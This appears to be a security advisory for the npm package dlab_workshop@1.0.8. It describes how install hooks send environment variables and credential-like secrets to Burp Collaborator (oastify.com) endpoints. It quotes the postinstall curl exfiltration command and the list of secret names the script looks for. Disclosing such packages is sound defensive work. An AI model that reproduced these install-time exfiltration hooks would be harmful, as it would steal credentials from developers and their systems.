summary: dlab_workshop exfiltrates environment variables to attacker-controlled OAST endpoints at install
details: dlab_workshop@1.0.8 exfiltrates installer environment variables to hardcoded Burp Collaborator (oastify.com) subdomains at npm install time and on require. package.json declares a preinstall hook that runs `node index.js` and a postinstall hook that runs `curl u2x44omqq3hyumumjp92c4y4fvlm9lxa.oastify.com/$FLAG`, sending the shell-expanded $FLAG env var to an attacker-controlled endpoint. index.js enumerates process.env, filters for credential-shaped names (API, KEY, SECRET, TOKEN, PASS, PASSWORD, DB, DATABASE, MONGO, REDIS, AWS, GITHUB, SLACK, WEBHOOK, AUTH, CERT, PRIVATE), base64-encodes the full env dump, and sends it via https.request as a query parameter to qa40ckumyzpu2i2irlhyk060nrtihf54.oastify.com/env. The package has no legitimate declared purpose consistent with this behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
